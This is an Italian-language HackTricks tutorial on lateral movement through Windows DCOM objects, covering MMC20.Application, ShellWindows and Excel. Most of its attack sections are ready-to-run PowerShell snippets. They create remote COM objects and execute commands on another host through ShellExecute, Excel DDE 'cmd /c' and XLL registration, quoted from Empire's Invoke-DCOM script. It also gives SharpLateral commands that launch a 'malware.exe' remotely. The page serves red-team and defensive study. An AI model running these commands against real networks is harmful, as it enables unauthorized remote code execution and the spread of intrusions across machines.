# DCOM Exec

<details>

<summary><strong>Impara a hackare AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **società di cybersecurity**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? O vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**Piani di Sottoscrizione**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merch ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**Per ulteriori informazioni su questa tecnica controlla il post originale da [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Il modello a oggetti dei componenti distribuiti (DCOM) presenta una capacità interessante per interazioni basate su rete con oggetti. Microsoft fornisce documentazione completa sia per DCOM che per il modello a oggetti dei componenti (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Un elenco di applicazioni DCOM può essere recuperato utilizzando il comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
L'oggetto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), consente la scripting delle operazioni degli snap-in MMC. In particolare, questo oggetto contiene un metodo `ExecuteShellCommand` sotto `Document.ActiveView`. Maggiori informazioni su questo metodo possono essere trovate [qui](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Controllalo in esecuzione:

Questa funzionalità facilita l'esecuzione di comandi su una rete tramite un'applicazione DCOM. Per interagire con DCOM da remoto come amministratore, PowerShell può essere utilizzato come segue:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. Il metodo ExecuteShellCommand può quindi essere invocato per eseguire un processo sull'host remoto. Il processo prevede i seguenti passaggi:

Controlla i metodi:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Ottieni RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Per ulteriori informazioni su questa tecnica, controlla il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L'oggetto **MMC20.Application** è stato identificato come privo di "LaunchPermissions" espliciti, impostando i permessi che consentono l'accesso agli Amministratori. Per ulteriori dettagli, è possibile esplorare un thread [qui](https://twitter.com/tiraniddo/status/817532039771525120), e si raccomanda l'uso di [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET per filtrare oggetti senza esplicito Permesso di Lancio.

Due oggetti specifici, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati a causa della loro mancanza di Permessi di Lancio espliciti. L'assenza di una voce di registro `LaunchPermission` sotto `HKCR:\AppID\{guid}` indica che non ci sono permessi espliciti.

###  ShellWindows
Per `ShellWindows`, che manca di un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitano l'istanza dell'oggetto utilizzando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID per `ShellWindows`. Una volta istanziato, è possibile interagire attraverso il metodo `WindowsShell.Item`, portando a invocazioni di metodi come `Document.Application.ShellExecute`.

Esempi di comandi PowerShell sono stati forniti per istanziare l'oggetto ed eseguire comandi da remoto:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Movimento Laterale con Oggetti DCOM di Excel

Il movimento laterale può essere ottenuto sfruttando gli oggetti DCOM di Excel. Per informazioni dettagliate, è consigliabile leggere la discussione su come sfruttare Excel DDE per il movimento laterale tramite DCOM sul [blog di Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Il progetto Empire fornisce uno script PowerShell, che dimostra l'utilizzo di Excel per l'esecuzione remota di codice (RCE) manipolando oggetti DCOM. Di seguito sono riportati frammenti dello script disponibile nel [repository GitHub di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), che mostrano diversi metodi per abusare di Excel per RCE:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Strumenti di Automazione per il Movimento Laterale

Due strumenti sono evidenziati per automatizzare queste tecniche:

- **Invoke-DCOM.ps1**: Uno script PowerShell fornito dal progetto Empire che semplifica l'invocazione di diversi metodi per eseguire codice su macchine remote. Questo script è accessibile nel repository GitHub di Empire.

- **SharpLateral**: Uno strumento progettato per eseguire codice da remoto, che può essere utilizzato con il comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Strumenti Automatici

* Lo script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) consente di invocare facilmente tutti i metodi commentati per eseguire codice su altre macchine.
* Puoi anche utilizzare [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Riferimenti

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
{% endhint %}
